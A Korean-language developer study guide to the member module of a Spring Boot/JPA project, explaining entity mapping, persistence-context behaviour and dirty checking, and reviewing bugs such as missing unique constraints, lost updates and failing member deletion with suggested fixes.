# member — 회원

> 선행 문서: [00-기초개념.md](../00-기초개념.md) · [global.md](../global.md)
>
> 이 도메인은 **JPA의 영속성 컨텍스트와 더티 체킹을 배우기에 가장 좋은 교재**입니다.
> 같은 클래스 안에서 "엔티티를 어떻게 얻었는지"에 따라 저장 방식이 갈리는 예가 나란히 있습니다.
> 동시에 **이 프로젝트에서 가장 위험한 보안 결함**이 여기 있습니다. ([7장](#7-🔴-치명적-누구나-남의-비밀번호를-바꿀-수-있다))

---

## 파일 지도

```
domain/member/
├── controller/MemberController.java        엔드포인트 11개
├── dto/
│   ├── request/  SignUpRequestDto, LoginRequestDto, ChangePasswordRequestDto,
│   │             ChangePasswordByUserIdRequestDto, ChangeNicknameRequestDto,
│   │             CheckPasswordRequestDto
│   └── response/ SignUpResponseDto, LoginResponseDto, GetUserResponseDto,
│                 GetUserIdByEmailResponseDto, TestUserResponseDto
├── entity/
│   ├── Member.java          회원 엔티티
│   └── MemberBase.java      @Embeddable — email/nickname/password/authority
├── exception/               10개 (EmailDuplicate, UserNotFound, InvalidPassword ...)
├── repository/MemberRepository.java
└── service/MemberService.java
```

**관계도**

```
      MemberController
            ↓
       MemberService ──── BCryptPasswordEncoder (global/config/AppConfig)
            ↓        └─── PointTierRepository (domain/pointTier)
      MemberRepository
            ↓
    Member ──@Embedded──> MemberBase
       └──@ManyToOne──> PointTier

  [global]
  JwtAuthenticationFilter  ─→ 로그인 (POST /login)  ─→ MemberService.getMemberTierOrder
  JwtAuthorizationFilter   ─→ 매 요청 회원 조회      ─→ PrincipalDetails로 감싸 SecurityContext에
  PrincipalOauth2UserService ─→ 소셜 로그인 시 회원 생성
```

> **로그인 API가 이 컨트롤러에 없다는 점**에 주의하세요.
> `POST /login`은 `JwtAuthenticationFilter`(필터 단계)가 처리합니다. → [global 5-5](../global.md#5-5-jwtauthenticationfilter--로그인-처리-인증-authentication)

---

# 1. 엔티티 — `Member`와 `MemberBase`

## 1-1. `Member`

```java
@Getter
@NoArgsConstructor(access = AccessLevel.PROTECTED)
@Entity
public class Member extends BaseTimeEntity {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "member_id")
    private Long id;

    @Embedded
    protected MemberBase memberBase;

    private String provider;      // "google" | "kakao" | "naver" | "SYSTEM" | null(일반가입)

    private int points;           // 현재 포인트 (Point 원장의 합계를 캐싱한 값)

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "tier_id")
    private PointTier currentTier;

    @Builder
    private Member(String email, String nickname, String password, String authority,
                   String provider, PointTier currentTier) {
        this.memberBase = new MemberBase(email, nickname, password, authority);
        this.provider = provider;
        this.points = 0;                    // 신규 회원은 항상 0으로 시작
        this.currentTier = currentTier;
    }

    public void changePoint(int points)      { this.points = points; }
    public void changeTier(PointTier tier)   { this.currentTier = tier; }
}
```

### 어노테이션 하나씩

| 어노테이션 | 역할 | 왜 이렇게 |
|---|---|---|
| `@Entity` | 이 클래스를 DB 테이블과 매핑 | 테이블명 미지정 → 클래스명 기준 `member` |
| `@Id` + `@GeneratedValue(IDENTITY)` | PK를 MySQL AUTO_INCREMENT에 맡김 | MySQL 표준 방식 → [기초개념 6-2](../00-기초개념.md#6-2-엔티티-매핑-어노테이션) |
| `@Column(name = "member_id")` | 컬럼명을 `id` → `member_id`로 | FK 이름(`member_id`)과 통일하려는 의도 |
| `@Embedded` | `MemberBase`의 필드를 이 테이블 컬럼으로 펼침 | 별도 테이블이 생기지 않음 |
| `@ManyToOne(fetch = LAZY)` | 여러 회원 : 하나의 티어 | **`LAZY`를 명시한 것이 중요** (아래 설명) |
| `@JoinColumn(name = "tier_id")` | FK 컬럼 이름 지정 | `member` 테이블에 `tier_id` 컬럼 생성 |
| `@NoArgsConstructor(PROTECTED)` | JPA용 기본 생성자, 외부 사용은 차단 | → [기초개념 3-1](../00-기초개념.md#3-1-생성자-계열) |
| `@Builder` + `private` 생성자 | 생성 경로를 빌더로 단일화 | 인자 순서 실수 방지 |

### `fetch = FetchType.LAZY`를 명시한 것이 왜 중요한가

`@ManyToOne`의 **기본값은 `EAGER`(즉시 로딩)** 입니다.
만약 기본값을 그대로 뒀다면:

```java
// EAGER였다면 — 회원을 조회할 때마다 티어까지 무조건 조회
memberRepository.findByMemberBaseEmail(email);
// SELECT ... FROM member LEFT JOIN point_tier ON ...   ← 항상 JOIN

// JwtAuthorizationFilter는 모든 요청마다 이 조회를 합니다
// → 티어가 필요 없는 요청에서도 JOIN 비용을 냅니다
```

`LAZY`면 `member.getCurrentTier()`를 실제로 호출할 때만 SELECT가 나갑니다.
→ [기초개념 6-6](../00-기초개념.md#6-6-연관관계와-지연-로딩lazy)

**연관관계 어노테이션 4종 정리**

| 어노테이션 | 관계 | 기본 fetch | FK가 있는 쪽 |
|---|---|---|---|
| `@ManyToOne` | N:1 (회원 N : 티어 1) | **EAGER** ⚠️ | 이쪽 (`member.tier_id`) |
| `@OneToMany` | 1:N | LAZY | 반대쪽 |
| `@OneToOne` | 1:1 | **EAGER** ⚠️ | 지정한 쪽 |
| `@ManyToMany` | N:M | LAZY | 중간 테이블 |

**규칙: `@ManyToOne`과 `@OneToOne`은 항상 `LAZY`를 명시하세요.**

### `points` 필드 — 왜 중복 저장하는가

포인트 이력은 `Point` 테이블에 전부 남습니다([point.md](point.md)).
그런데 `Member.points`에도 현재 합계를 또 저장합니다. **의도적인 반정규화(denormalization)** 입니다.

```java
// points 필드가 없다면 — 회원 정보를 볼 때마다 집계 쿼리
SELECT SUM(amount) FROM points WHERE member_id = 1;

// points 필드가 있으면 — 그냥 컬럼 하나 읽기
SELECT points FROM member WHERE member_id = 1;
```

게시글 목록에서 작성자 레벨을 표시하려면 **목록의 모든 작성자**에 대해 이 계산이 필요합니다.
그래서 캐싱하는 것입니다.

**대가**: 두 곳의 값이 어긋날 수 있습니다(정합성 문제).
그래서 `PointService`가 포인트를 만들 때 `member.changePoint(합계)`로 반드시 함께 갱신합니다.
그런데 그 코드가 트랜잭션 밖에서 실행되는 버그가 있습니다. → [point.md](point.md)

### `changePoint` / `changeTier` — setter를 쓰지 않는 이유

```java
public void changePoint(int points) { this.points = points; }
```

`setPoints`가 아니라 `changePoint`입니다. 기능은 같지만 이름이 다릅니다.
→ [기초개념 3-3](../00-기초개념.md#3-3-getter--그리고-setter가-없는-이유)

> 다만 `changePoint(int)`는 **"이 값으로 덮어써라"** 라는 의미입니다.
> `addPoint(int delta)`처럼 **증감**을 표현하면 동시성 사고를 줄일 수 있습니다.
> 지금 방식은 "합계를 계산해서 넣어주는 쪽(PointService)을 신뢰"하는 구조입니다.

## 1-2. `MemberBase` — `@Embeddable` 값 타입

```java
@Getter
@NoArgsConstructor(access = AccessLevel.PROTECTED)
@AllArgsConstructor
@Embeddable
public class MemberBase {

  private String email;
  private String nickname;
  private String password;
  private String authority;      // "ROLE_USER" | "ROLE_BOT"

  public void changePassword(String encodedNewPassword) { this.password = encodedNewPassword; }
  public void changeNickname(String nickname) { this.nickname = nickname; }
}
```

**`@Embeddable` / `@Embedded`의 동작**

```
[코드 구조]                       [실제 DB 테이블 — member]
Member                            ┌──────────────┬─────────────┐
├── id                            │ member_id    │ BIGINT PK   │
├── memberBase                    │ email        │ VARCHAR     │  ← MemberBase의 필드가
│   ├── email                     │ nickname     │ VARCHAR     │     그대로 컬럼이 됨
│   ├── nickname                  │ password     │ VARCHAR     │
│   ├── password                  │ authority    │ VARCHAR     │
│   └── authority                 │ provider     │ VARCHAR     │
├── provider                      │ points       │ INT         │
├── points                        │ tier_id      │ BIGINT FK   │
└── currentTier                   │ created_at   │ DATETIME    │  ← BaseTimeEntity
                                  │ updated_at   │ DATETIME    │
                                  └──────────────┴─────────────┘
```

**테이블은 하나입니다.** `member_base` 테이블이 따로 생기지 않습니다.

**왜 굳이 묶었는가?** "이메일·닉네임·비밀번호·권한"은 **회원의 신원 정보**라는 하나의 개념입니다.
값 타입(Value Object)으로 묶으면 이 개념에 관련된 동작(`changePassword`)을 그 안에 둘 수 있습니다.

**대가**: 접근 경로가 한 단계 깊어집니다.

```java
member.getMemberBase().getEmail()        // 이 프로젝트 전체에 반복되는 패턴
member.getMemberBase().changePassword(encoded)
```

> 이 프로젝트 규모에서는 `@Embedded`의 이점보다 비용(코드 장황함)이 커 보입니다.
> `Member`에 필드를 직접 두는 편이 단순합니다. 다만 **틀린 설계는 아니고**,
> `@Embeddable`을 이해하는 데는 좋은 예입니다.

### ⚠️ 문제 — 유니크 제약이 없다

```java
private String email;      // @Column(unique = true)가 없다!
private String nickname;   // 여기도 없다
```

DB 레벨에서 중복이 막혀 있지 않습니다. 애플리케이션 코드로만 확인합니다:

```java
memberRepository.findByMemberBaseEmail(dto.email()).ifPresent(user -> {
    throw new EmailDuplicateException();
});
// ... 그 사이에 다른 요청이 같은 이메일로 저장할 수 있다
memberRepository.save(newMember);
```

**경쟁 조건(race condition)**: 두 요청이 거의 동시에 같은 이메일로 가입하면
**둘 다 중복 검사를 통과하고 둘 다 저장됩니다.** 이후 `findByMemberBaseEmail`은
`Optional`을 반환하는데 결과가 2건이므로 `IncorrectResultSizeDataAccessException`이 터집니다.
**로그인이 영구적으로 불가능해집니다.**

**해결** — 검사 로직은 사용자 경험용으로 남기고, **최종 방어선은 DB에 둡니다**:

```java
@Embeddable
public class MemberBase {
    @Column(nullable = false)
    private String email;

    @Column(nullable = false, length = 20)
    private String nickname;
    ...
}

@Entity
@Table(name = "member", uniqueConstraints = {
    @UniqueConstraint(name = "uk_member_email_provider", columnNames = {"email", "provider"}),
    @UniqueConstraint(name = "uk_member_nickname", columnNames = {"nickname"})
})
public class Member extends BaseTimeEntity { ... }
```

> `(email, provider)` 복합 유니크로 두면 같은 이메일로 구글·카카오 계정을 각각 가질 수 있습니다.
> 그러면 [global 6-4](../global.md#이메일에-제공자-이름을-붙이는-트릭)에서 본
> `email + "GoogleOAuth2"` 접미사 트릭도 필요 없어집니다.
>
> ⚠️ 단, `ddl-auto: update`는 **기존 테이블에 제약을 추가해주지 않습니다.**
> 실제로 적용하려면 SQL을 직접 실행해야 하고, 그 전에 이미 들어간 중복 데이터를 정리해야 합니다.

---

# 2. `MemberRepository` — 인터페이스 3줄이 전부

```java
public interface MemberRepository extends JpaRepository<Member, Long> {

    Optional<Member> findByMemberBaseEmail(String email);
    Optional<Member> findByMemberBaseEmailAndProvider(String email, String provider);
    Optional<Member> findByMemberBase_Nickname(String memberBaseNickname);
}
```

**구현 클래스가 없는데 어떻게 동작하나**
스프링이 기동 시점에 이 인터페이스의 프록시 구현체를 만들어 빈으로 등록합니다.
→ [기초개념 6-8](../00-기초개념.md#6-8-spring-data-jpa-리포지토리--인터페이스만-쓰면-끝)

**`JpaRepository<Member, Long>`이 공짜로 주는 메서드**

```java
save(entity), saveAll(list), findById(id), findAll(), findAll(Pageable),
existsById(id), count(), delete(entity), deleteById(id), flush() ...
```

## 2-1. 메서드 이름 해석 — `@Embedded` 필드를 파고들기

```java
Optional<Member> findByMemberBaseEmail(String email);
//                     └─────┬────┘└┬┘
//                      memberBase   email  →  member.memberBase.email
```

생성되는 JPQL:

```sql
SELECT m FROM Member m WHERE m.memberBase.email = :email
-- 실제 SQL: SELECT * FROM member WHERE email = ?
```

`@Embedded` 필드는 이렇게 **경로를 이어 붙여** 표현합니다.

## 2-2. 언더스코어(`_`)는 왜 붙였다 말았다 하는가

```java
findByMemberBaseEmail(...)        // 언더스코어 없음
findByMemberBase_Nickname(...)    // 언더스코어 있음
```

**둘 다 동작하지만 이유가 다릅니다.**

스프링은 메서드 이름을 파싱할 때 이런 순서로 시도합니다:

1. 전체를 하나의 프로퍼티로 본다 → `memberBaseEmail` 필드가 있나? 없다.
2. 카멜케이스 경계에서 **뒤에서부터** 쪼개본다 → `memberBase.email`? 있다! ✅

`findByMemberBaseNickname`도 같은 방식으로 `memberBase.nickname`을 찾아냅니다.
하지만 **모호한 경우**가 생길 수 있습니다.

예를 들어 `Member`에 `memberBase`와 `memberBaseNick`이라는 두 필드가 있다면
`findByMemberBaseNickName`이 어느 쪽인지 판단이 갈립니다.

**`_`는 "여기서 확실히 끊어라"는 명시적 구분자입니다.**

```java
findByMemberBase_Nickname(...)   // memberBase 라는 필드의 nickname → 추측 없음
```

> **권장: 중첩 프로퍼티에는 항상 `_`를 쓰세요.** 성능 차이는 없고 의도가 명확해집니다.
> 지금처럼 두 방식이 섞여 있으면 읽는 사람이 혼란스럽습니다.

## 2-3. 개선 — 존재 확인은 `existsBy`가 맞다

```java
// 현재 — 엔티티 전체를 SELECT해서 가져온 뒤 버린다
memberRepository.findByMemberBaseEmail(email).ifPresent(user -> {
    throw new EmailDuplicateException();
});

// 개선 — SELECT 1 로 존재만 확인
boolean exists = memberRepository.existsByMemberBaseEmail(email);
if (exists) throw new EmailDuplicateException();
```

`findBy...`는 모든 컬럼을 읽고 엔티티 객체를 만들고 영속성 컨텍스트에 등록합니다.
`existsBy...`는 `SELECT 1 ... LIMIT 1`만 실행합니다. **중복 확인 API는 호출 빈도가 높으므로**
(닉네임 입력할 때마다 호출되는 경우가 많음) 차이가 누적됩니다.

---

# 3. `MemberService` — JPA 저장 방식 3가지가 한 파일에

```java
@Service
@Transactional              // ★ 클래스 레벨 — 모든 public 메서드에 적용
@RequiredArgsConstructor
public class MemberService {

    private final MemberRepository memberRepository;
    private final BCryptPasswordEncoder passwordEncoder;
    private final PointTierRepository pointTierRepository;
```

**클래스 레벨 `@Transactional`의 의미**: 이 클래스의 **모든 `public` 메서드**가
트랜잭션 안에서 실행됩니다. 메서드마다 붙이지 않아도 됩니다.
(`private` 메서드에는 적용되지 않습니다 → [기초개념 4-4](../00-기초개념.md#4-4-프록시--spring-마법의-정체))

**우선순위**: 메서드 레벨 어노테이션이 클래스 레벨을 덮어씁니다.

```java
@Service
@Transactional(readOnly = true)     // 기본은 읽기 전용
public class MemberService {

    public GetUserResponseDto getMemberInfo(...) { ... }   // readOnly = true 적용

    @Transactional                                          // 여기만 쓰기 가능
    public SignUpResponseDto signup(...) { ... }
}
```

**이것이 권장 패턴입니다.** 지금은 반대로 되어 있어 조회 메서드도 쓰기 트랜잭션으로 돕니다.
→ [6장 개선점](#6-개선하면-좋은-것)

## 3-1. `signup` — 새 엔티티 INSERT

```java
public SignUpResponseDto signup(SignUpRequestDto signUpRequestDto) {

    // ① 이메일 중복 확인
    memberRepository.findByMemberBaseEmail(signUpRequestDto.email()).ifPresent(user -> {
        throw new EmailDuplicateException();
    });

    // ② 비밀번호 해싱
    String encodedPassword = passwordEncoder.encode(signUpRequestDto.password());

    // ③ 중복되지 않는 닉네임 생성
    String generatedNickname = "";
    while (true) {
        generatedNickname = NicknameGenerator.generateName();
        if (memberRepository.findByMemberBase_Nickname(generatedNickname).isEmpty()) break;
    }

    // ④ 기본 티어 조회
    PointTier pointTier = pointTierRepository.findById(1L).orElseThrow(PointTierIsNotExistException::new);

    // ⑤ 엔티티 생성 + 저장
    Member newMember = signUpRequestDto.toEntity(encodedPassword, generatedNickname, pointTier);
    memberRepository.save(newMember);

    return SignUpResponseDto.fromEntity(newMember);
}
```

### `save()`가 여기서 하는 일 — `persist()`

`newMember`는 `@Id`가 `null`인 **비영속(new) 상태**입니다.
따라서 `save()` 내부에서 `isNew()`가 `true`가 되고 `em.persist()`가 호출됩니다.

```java
// SimpleJpaRepository
public <S extends T> S save(S entity) {
    if (entityInformation.isNew(entity)) {   // @Id == null → true
        em.persist(entity);                   // INSERT
        return entity;
    }
    return em.merge(entity);
}
```

`IDENTITY` 전략이므로 **`persist()` 시점에 INSERT가 즉시 실행됩니다**(ID를 받아와야 하므로).
그래서 다음 줄 `SignUpResponseDto.fromEntity(newMember)`에서 `newMember.getId()`가 값을 갖습니다.

> `SEQUENCE` 전략이라면 `persist()`가 INSERT를 미루고 커밋 시점에 몰아서 실행합니다.
> `IDENTITY`는 그 최적화가 불가능합니다. → [기초개념 6-2](../00-기초개념.md#generatedvalue-전략)

### `toEntity` — DTO가 엔티티를 만든다

```java
public record SignUpRequestDto(
        @Pattern(regexp = "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$",
                 message = "이메일 형식이 유효하지 않습니다")
        @NotNull(message = "email은 필수값입니다")
        String email,

        @NotNull(message = "password는 필수값입니다")
        String password
) {
    public Member toEntity(String encodedPassword, String generatedNickname, PointTier pointTier) {
        return Member.builder()
                .email(email)
                .nickname(generatedNickname)
                .password(encodedPassword)          // 평문이 아니라 해시를 받는다
                .authority("ROLE_USER")
                .currentTier(pointTier)
                .build();
    }
}
```

**주목할 점**: `toEntity`가 `encodedPassword`를 **인자로 받습니다.**
DTO가 직접 해싱하지 않는 이유는 DTO가 `PasswordEncoder` 빈을 알 필요가 없기 때문입니다.
**"DTO는 데이터만, 협력 객체는 서비스가"** 라는 경계를 지킨 것입니다. 좋은 판단입니다.

**검증 어노테이션 정리**

| 어노테이션 | 검사 | 주의 |
|---|---|---|
| `@NotNull` | `null`이 아님 | **빈 문자열 `""`은 통과** |
| `@NotEmpty` | `null` 아님 + 길이 > 0 | **공백만 있는 `"  "`은 통과** |
| `@NotBlank` | `null` 아님 + 공백 제외 길이 > 0 | 문자열에는 이게 정답 |
| `@Size(max=20)` | 길이 범위 | 문자열·컬렉션 |
| `@Pattern(regexp=...)` | 정규식 | `null`은 통과 (`@NotNull`과 같이 써야 함) |
| `@Email` | 이메일 형식 | 스펙이 느슨해서 직접 정규식을 쓰는 경우도 많음 |

### ⚠️ 문제 3가지

**① 비밀번호 정책이 없습니다.**

```java
@NotNull(message = "password는 필수값입니다")
String password
```

`"1"` 한 글자도 통과합니다. `ChangePasswordRequestDto`, `ChangePasswordByUserIdRequestDto`에는
검증 어노테이션이 **아예 없습니다.**

```java
// 추가해야 할 검증
@NotBlank(message = "비밀번호는 필수값입니다")
@Size(min = 8, max = 64, message = "비밀번호는 8~64자여야 합니다")
@Pattern(regexp = "^(?=.*[A-Za-z])(?=.*\\d)(?=.*[^A-Za-z\\d]).{8,}$",
         message = "영문·숫자·특수문자를 각각 포함해야 합니다")
String password
```

**② 닉네임 생성 루프가 종료를 보장하지 않습니다.**
`NicknameGenerator`의 조합은 29 × 31 × 27 = **24,273개**뿐입니다.
회원이 늘면 루프가 길어지고 이론적으로 무한 루프가 가능합니다.
게다가 반복마다 DB 조회가 발생합니다.
→ [global 6-4](../global.md#️-닉네임-중복-확인-루프의-문제)에 같은 문제와 해결책이 있습니다.
**`PrincipalOauth2UserService`와 완전히 동일한 코드가 복사되어 있으니 공통 메서드로 빼야 합니다.**

**③ 기본 티어 ID를 `1L`로 하드코딩합니다.**

```java
PointTier pointTier = pointTierRepository.findById(1L).orElseThrow(PointTierIsNotExistException::new);
```

`point_tier` 테이블의 1번이 최하위 티어라는 **암묵적 가정**입니다.
데이터를 다시 넣으면서 ID가 바뀌면 신규 회원이 엉뚱한 티어로 시작합니다.

```java
// 의미로 조회하는 편이 안전
PointTier pointTier = pointTierRepository.findFirstByOrderByTierOrderAsc()
        .orElseThrow(PointTierIsNotExistException::new);
// 또는
PointTier pointTier = pointTierRepository.findByTierType(TierType.BRONZE)
        .orElseThrow(PointTierIsNotExistException::new);
```

> 참고로 `AiMemberInitializer`는 같은 목적을 이렇게 처리합니다:
> `pointTierRepository.findAll().stream().min(comparing(getTierOrder))`
> — ID에 의존하지 않으므로 이쪽이 더 낫습니다(전체 조회 비용은 있지만).

## 3-2. `changeNickname` — **더티 체킹**으로 UPDATE

여기가 이 문서의 핵심 학습 지점입니다.

```java
public void changeNickname(PrincipalDetails principalDetails,
                           @Valid ChangeNicknameRequestDto changeNicknameRequestDto) {

    // 닉네임 중복 확인
    memberRepository.findByMemberBase_Nickname(changeNicknameRequestDto.nickname())
            .ifPresent(user -> { throw new NicknameAlreadyExistsException(); });

    // ★ DB에서 다시 조회한다 → 이 엔티티는 "영속 상태"
    Member member = memberRepository.findById(principalDetails.getMember().getId())
            .orElseThrow(UserNotFoundException::new);

    member.getMemberBase().changeNickname(changeNicknameRequestDto.nickname());

    // ★ save()를 호출하지 않는다! 그런데도 UPDATE가 실행된다.
}
```

**왜 `save()` 없이 저장되는가**

```
① @Transactional 시작 → 영속성 컨텍스트 생성
        ↓
② findById(1) 실행
   SELECT * FROM member WHERE member_id = 1
   → Member 객체를 만들어 영속성 컨텍스트에 등록
   → 동시에 "스냅샷"(원본 값 복사본)을 따로 보관   ★
        ↓
③ member.getMemberBase().changeNickname("새닉네임")
   → 자바 객체의 필드만 바뀜. SQL은 아직 안 나감.
        ↓
④ 메서드 종료 → 트랜잭션 커밋 → flush() 자동 실행
   → 현재 값과 ②의 스냅샷을 필드별로 비교           ★
   → nickname이 달라졌다! → UPDATE SQL 자동 생성
   UPDATE member SET nickname = '새닉네임', updated_at = ? WHERE member_id = 1
        ↓
⑤ COMMIT
```

이것이 **더티 체킹(Dirty Checking)** 입니다.
→ [기초개념 6-4](../00-기초개념.md#6-4-더티-체킹--save-없이-update가-되는-이유)

**핵심 원칙**

> **영속 상태 엔티티의 변경은 `save()` 없이 반영됩니다.**
> `save()`는 **새 엔티티를 INSERT할 때만** 필요합니다.

**`principalDetails.getMember()`를 그냥 쓰지 않고 다시 조회한 이유**

`principalDetails` 안의 `Member`는 `JwtAuthorizationFilter`가 만든 것입니다.
그 필터는 트랜잭션이 없으므로, 조회가 끝난 직후 그 엔티티는 **준영속(detached)** 상태가 됩니다.

```
[JwtAuthorizationFilter]  memberRepository.findByMemberBaseEmail(email)
                            → 짧은 트랜잭션에서 조회 → 트랜잭션 종료 → 준영속!
                            → PrincipalDetails에 담아 SecurityContext에 저장
                                        ↓
[MemberService.changeNickname]  principalDetails.getMember()  ← 준영속 엔티티
                                → 값을 바꿔도 더티 체킹 대상이 아님 → DB 반영 안 됨 ❌
                                → 그래서 findById로 다시 조회해 영속 상태로 만든다 ✅
```

**정확한 판단입니다.** 그런데 바로 아래 메서드는 다르게 처리합니다.

## 3-3. `changePassword` — **`merge()`** 로 UPDATE

```java
public void changePassword(PrincipalDetails principalDetails,
                           ChangePasswordRequestDto changePasswordRequestDto) {
    Member member = principalDetails.getMember();      // ★ 준영속 엔티티를 그대로 쓴다

    String currentPassword = member.getMemberBase().getPassword();
    String newPassword = changePasswordRequestDto.newPassword();

    if (!passwordEncoder.matches(changePasswordRequestDto.currentPassword(), currentPassword)) {
        throw new InvalidPasswordException();
    }
    if (passwordEncoder.matches(newPassword, currentPassword)) {
        throw new NewPasswordSameAsOldException();
    }

    String encodedNewPassword = passwordEncoder.encode(newPassword);
    member.getMemberBase().changePassword(encodedNewPassword);
    memberRepository.save(member);                     // ★ save()가 반드시 필요하다
}
```

**여기서는 `save()`가 없으면 저장되지 않습니다.** `member`가 준영속이라 더티 체킹 대상이 아니기 때문입니다.

**`save()`가 이 경우 하는 일 — `merge()`**

```java
public <S extends T> S save(S entity) {
    if (entityInformation.isNew(entity)) {  // @Id가 있으므로 false
        em.persist(entity);
    }
    return em.merge(entity);                 // ← 이쪽!
}
```

`merge()`의 실제 동작:

```
① SELECT * FROM member WHERE member_id = 1     ← DB에서 다시 읽어 영속 엔티티를 만든다
② 넘긴 준영속 객체의 모든 필드를 그 영속 엔티티로 복사
③ 커밋 시 더티 체킹 → UPDATE
```

**즉 `merge()`는 SELECT를 한 번 더 합니다.** `findById` + 필드 변경(3-2 방식)과 쿼리 수는 같지만,
**`merge()`에는 위험이 있습니다.**

### ⚠️ `merge()`의 함정 — 필드 전체를 덮어쓴다

`merge()`는 넘긴 객체의 **모든 필드**를 복사합니다. 일부만 채운 객체를 넘기면 나머지가 `null`로 밀립니다.

```java
// 위험한 예 (이 프로젝트 코드는 아님, 원리 설명용)
Member partial = Member.builder().email("a@b.com").build();   // nickname, points 등이 null/0
// ↑ 이 객체에 억지로 id를 넣고 save()하면
// UPDATE member SET email='a@b.com', nickname=NULL, points=0 ... ← 데이터 소실!
```

이 프로젝트의 `changePassword`는 **완전한 엔티티**(필터가 DB 전체를 읽어온 것)를 넘기므로
실제 사고는 나지 않습니다. 다만 **더 심각한 문제가 있습니다.**

### ⚠️ 진짜 문제 — 오래된 스냅샷으로 덮어쓴다 (Lost Update)

`principalDetails.getMember()`는 **이 HTTP 요청이 시작될 때 읽은 값**입니다.
그 사이 다른 요청이 회원 정보를 바꿨다면?

```
시각  요청 A (비밀번호 변경)                요청 B (포인트 적립)
────────────────────────────────────────────────────────────────────
t1   필터가 Member 조회 (points=100)
t2                                        Member 조회 후 points=150으로 UPDATE 커밋
t3   member.changePassword(...)
t4   save(member) → merge
     → 준영속 객체의 points는 여전히 100
     → UPDATE member SET password=?, points=100 ...   ⚠️ 150이 100으로 되돌아감!
```

**포인트 50점이 사라집니다.** 이것이 **Lost Update(갱신 유실)** 입니다.

**해결 — `changeNickname`처럼 다시 조회하면 됩니다**

```java
public void changePassword(PrincipalDetails principalDetails, ChangePasswordRequestDto dto) {
    // ★ 트랜잭션 안에서 최신 상태를 다시 읽는다 → 영속 상태
    Member member = memberRepository.findById(principalDetails.getMember().getId())
            .orElseThrow(UserNotFoundException::new);

    String currentPassword = member.getMemberBase().getPassword();

    if (!passwordEncoder.matches(dto.currentPassword(), currentPassword)) {
        throw new InvalidPasswordException();
    }
    if (passwordEncoder.matches(dto.newPassword(), currentPassword)) {
        throw new NewPasswordSameAsOldException();
    }

    member.getMemberBase().changePassword(passwordEncoder.encode(dto.newPassword()));
    // save() 불필요 — 더티 체킹이 처리
}
```

**규칙으로 정리하면:**

> **`principalDetails.getMember()`는 "누가 요청했는지(ID)"를 알아내는 용도로만 쓰세요.**
> **엔티티를 수정할 때는 반드시 트랜잭션 안에서 `findById`로 다시 조회하세요.**

`checkPassword`도 `principalDetails.getMember()`의 비밀번호를 비교합니다.
읽기만 하므로 갱신 유실은 없지만, **비밀번호가 방금 바뀌었다면 옛 값과 비교**하게 됩니다.

## 3-4. 저장 방식 3가지 총정리

| 방식 | 코드 | SQL | 언제 쓰나 |
|---|---|---|---|
| **persist** | `save(새엔티티)` | INSERT | 새로 만들 때 |
| **더티 체킹** | `findById()` → 필드 변경 (`save()` 불필요) | SELECT + UPDATE | **수정할 때 (권장)** ✅ |
| **merge** | `save(준영속엔티티)` | SELECT + UPDATE | 어쩔 수 없을 때만 |

이 프로젝트는 **세 방식이 모두 등장하며, 일관성이 없습니다.**
`changeNickname`(더티 체킹)과 `changePassword`(merge)가 나란히 있는 것이 그 증거입니다.
**더티 체킹 방식으로 통일해야 합니다.**

## 3-5. `deleteMember` — 물리 삭제의 위험

```java
public void deleteMember(PrincipalDetails principalDetails) {
    Member member = memberRepository.findById(principalDetails.getMember().getId())
            .orElseThrow(UserNotFoundException::new);
    memberRepository.delete(member);       // DELETE FROM member WHERE member_id = ?
}
```

### ⚠️ 문제 — FK 제약 위반으로 실패한다

`Member`를 참조하는 테이블이 많습니다:

```
Point.member          @ManyToOne  →  points.member_id
Board.member          @ManyToOne  →  board.member_id
Comment.member        @ManyToOne  →  comment.member_id
BoardLike.member      @ManyToOne  →  board_like.member_id
Attendance.member     @ManyToOne  →  attendance.member_id
Payment.member        @ManyToOne  →  payment.member_id
Conversation.member   @ManyToOne  →  conversations.member_id
InterviewSession      @ManyToOne  →  interview_session.member_id
ModelFeedback.member  @ManyToOne  →  model_feedback.member_id
```

**게시글을 하나라도 쓴 회원은 삭제할 수 없습니다.**

```
DELETE FROM member WHERE member_id = 5
      ↓
MySQL: Cannot delete or update a parent row: a foreign key constraint fails
      ↓
DataIntegrityViolationException
      ↓
GlobalExceptionRestAdvice.dbException() → 500 "서버 에러!"
```

즉 **회원탈퇴 기능이 사실상 동작하지 않습니다** (포인트 이력이 없는 신규 회원만 성공).

### 왜 `cascade`를 걸면 안 되는가

```java
// 이렇게 하면 될 것 같지만 —
@OneToMany(mappedBy = "member", cascade = CascadeType.REMOVE)
private List<Board> boards;
```

**게시글과 댓글이 전부 사라집니다.** 커뮤니티에서 회원 하나가 탈퇴할 때
그 사람이 쓴 글에 달린 다른 사람들의 댓글까지 연쇄 삭제되면 **커뮤니티가 망가집니다.**

### 해결 — Soft Delete가 정답

이 프로젝트는 이미 `Board`, `Comment`에 soft delete를 씁니다. `Member`에도 같은 방식을 적용합니다.

```java
@Entity
public class Member extends BaseTimeEntity {
    ...
    @Column(nullable = false)
    private String deleteYn = "N";

    private LocalDateTime deletedAt;

    public void withdraw() {
        this.deleteYn = "Y";
        this.deletedAt = LocalDateTime.now();
        // 개인정보 비식별 처리 (GDPR·개인정보보호법 대응)
        this.memberBase.anonymize();    // email → "deleted_5@removed", nickname → "탈퇴한 회원"
    }
}
```

```java
@Transactional
public void deleteMember(PrincipalDetails principalDetails) {
    Member member = memberRepository.findById(principalDetails.getMember().getId())
            .orElseThrow(UserNotFoundException::new);
    member.withdraw();
}
```

그리고 로그인 시 `deleteYn = 'Y'`인 회원을 거부하면 됩니다.
`PrincipalDetails.isEnabled()`가 지금 항상 `true`를 반환하는데, 여기에 연결하면 딱 맞습니다.

```java
@Override
public boolean isEnabled() {
    return "N".equals(member.getDeleteYn());    // 탈퇴 회원은 인증 거부
}
```

> Spring Security의 `DaoAuthenticationProvider`가 `isEnabled()`를 확인해
> `false`면 `DisabledException`을 던집니다. **이미 마련된 확장점을 활용하는 것**입니다.

## 3-6. `getMemberTierOrder` — 오버로딩

```java
public int getMemberTierOrder(Member member) {
    return pointTierRepository.findTierOrderByPoints(member.getPoints());
}

public int getMemberTierOrder(int memberPoints) {
    return pointTierRepository.findTierOrderByPoints(memberPoints);
}
```

**오버로딩(overloading)**: 같은 이름, 다른 파라미터. 컴파일 시점에 어느 것을 부를지 결정됩니다.
